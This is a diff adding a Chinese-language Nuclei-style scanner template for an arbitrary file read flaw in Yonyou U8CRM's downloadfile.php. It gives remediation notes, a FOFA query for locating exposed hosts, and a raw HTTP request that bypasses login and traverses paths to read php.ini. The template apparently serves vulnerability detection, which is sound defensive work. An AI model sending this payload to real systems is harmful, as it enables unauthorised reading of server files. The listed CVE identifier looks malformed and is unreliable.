@@ -1,0 +1,43 @@
+id: 2024-105131740
+
+info:
+  name: 用友U8CRM客户关系管理系统downloadfile.php存在任意文件读取漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。
+  reference:
+    - https://security.yonyou.com/#/noticeInfo?id=511
+  remediation: |
+      购买了SPS服务的用户，通过ISD安装TU后缀的补丁即可。
+      没有购买SPS服务的用户，可解压本安全补丁中的压缩包。将压缩包中的内容覆盖到U8SOFT目录即可。
+      U8从v16.5开始，CRM不再作为主安装盘的一部分，如果没有单独安装U8CRM，则不会受到本漏洞影响，无需进行任何处理。  
+  classification:
+    cve-id: 2024-105131740
+    cvss-score: 7.1
+    cwe-id: CWE-98
+  metadata:
+    date: 2024-02-27
+    version: | 
+      此漏洞影响V16.1, V16.0, V15.1, V15.0, V13版本
+    fofa-query: app="用友U8CRM"
+  tags: yonyou,lfi,afr,u8crm
+
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "[PHP]")'
+        condition: and
